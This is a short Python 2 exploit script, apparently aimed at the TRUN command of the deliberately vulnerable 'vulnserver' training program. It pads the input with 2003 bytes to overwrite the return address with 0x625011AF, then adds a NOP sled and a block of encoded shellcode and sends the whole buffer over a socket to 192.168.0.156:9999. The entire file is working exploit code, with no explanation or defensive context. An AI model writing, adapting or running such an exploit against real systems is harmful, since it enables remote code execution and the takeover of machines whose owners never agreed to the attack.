#!/usr/bin/python

import socket


shellcode = ("\xda\xc4\xba\x4d\xa8\x9b\xbc\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x31\x31\x53\x18\x83\xeb\xfc\x03\x53\x59\x4a\x6e\x40\x89\x08"
"\x91\xb9\x49\x6d\x1b\x5c\x78\xad\x7f\x14\x2a\x1d\x0b\x78\xc6"
"\xd6\x59\x69\x5d\x9a\x75\x9e\xd6\x11\xa0\x91\xe7\x0a\x90\xb0"
"\x6b\x51\xc5\x12\x52\x9a\x18\x52\x93\xc7\xd1\x06\x4c\x83\x44"
"\xb7\xf9\xd9\x54\x3c\xb1\xcc\xdc\xa1\x01\xee\xcd\x77\x1a\xa9"
"\xcd\x76\xcf\xc1\x47\x61\x0c\xef\x1e\x1a\xe6\x9b\xa0\xca\x37"
"\x63\x0e\x33\xf8\x96\x4e\x73\x3e\x49\x25\x8d\x3d\xf4\x3e\x4a"
"\x3c\x22\xca\x49\xe6\xa1\x6c\xb6\x17\x65\xea\x3d\x1b\xc2\x78"
"\x19\x3f\xd5\xad\x11\x3b\x5e\x50\xf6\xca\x24\x77\xd2\x97\xff"
"\x16\x43\x7d\x51\x26\x93\xde\x0e\x82\xdf\xf2\x5b\xbf\xbd\x98"
"\x9a\x4d\xb8\xee\x9d\x4d\xc3\x5e\xf6\x7c\x48\x31\x81\x80\x9b"
"\x76\x7d\xcb\x86\xde\x16\x92\x52\x63\x7b\x25\x89\xa7\x82\xa6"
"\x38\x57\x71\xb6\x48\x52\x3d\x70\xa0\x2e\x2e\x15\xc6\x9d\x4f"
"\x3c\xa5\x40\xdc\xdc\x04\xe7\x64\x46\x59")


buff = "TRUN /.:/" #command to be sent
buff += "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 10  + shellcode + "C" * (2500-len(shellcode))

#625011AF EIP offset

s = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) # creating the socket
s.connect(("192.168.0.156",9999)) #connect to the target
print s.recv(1024) #print response
s.send(buff) #send the stage
s.close() #close socket
